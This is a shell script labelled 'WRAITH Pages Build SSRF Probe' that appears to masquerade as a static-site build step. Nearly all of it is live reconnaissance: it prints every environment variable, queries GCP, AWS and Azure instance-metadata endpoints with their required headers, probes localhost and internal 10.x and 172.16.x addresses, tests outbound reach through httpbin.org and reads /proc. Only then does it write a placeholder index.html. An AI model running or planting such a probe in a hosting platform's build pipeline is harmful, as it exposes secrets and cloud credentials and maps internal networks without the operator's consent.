#!/bin/sh
echo "=== WRAITH Pages Build SSRF Probe ==="
echo "=== Environment ==="
env | sort

echo ""
echo "=== Network Interfaces ==="
ifconfig 2>/dev/null || ip addr 2>/dev/null || echo "no network tools"

echo ""
echo "=== DNS Resolution ==="
nslookup metadata.google.internal 2>/dev/null || echo "nslookup not available"
host metadata.google.internal 2>/dev/null || echo "host not available"
getent hosts metadata.google.internal 2>/dev/null || echo "getent not available"

echo ""
echo "=== GCP Metadata (169.254.169.254) ==="
curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/" 2>&1 || echo "BLOCKED or TIMEOUT"

echo ""
echo "=== GCP Metadata (metadata.google.internal) ==="
curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>&1 || echo "BLOCKED or TIMEOUT"

echo ""
echo "=== AWS Metadata ==="
curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 || echo "BLOCKED or TIMEOUT"

echo ""
echo "=== Azure Metadata ==="
curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED or TIMEOUT"

echo ""
echo "=== Localhost probes ==="
curl -s --connect-timeout 3 "http://127.0.0.1:8080/" 2>&1 || echo "localhost:8080 - BLOCKED or TIMEOUT"
curl -s --connect-timeout 3 "http://127.0.0.1:80/" 2>&1 || echo "localhost:80 - BLOCKED or TIMEOUT"

echo ""
echo "=== Internal network probes ==="
curl -s --connect-timeout 3 "http://10.0.0.1/" 2>&1 || echo "10.0.0.1 - BLOCKED or TIMEOUT"
curl -s --connect-timeout 3 "http://172.16.0.1/" 2>&1 || echo "172.16.0.1 - BLOCKED or TIMEOUT"

echo ""
echo "=== Outbound connectivity test ==="
curl -s --connect-timeout 3 "https://httpbin.org/ip" 2>&1 || echo "outbound BLOCKED"

echo ""
echo "=== /proc info ==="
cat /proc/self/cgroup 2>/dev/null | head -5 || echo "no cgroup info"
cat /proc/version 2>/dev/null || echo "no proc/version"

echo ""
echo "=== Build complete ==="
# Create output
mkdir -p dist
echo "<html><body>SSRF Test</body></html>" > dist/index.html

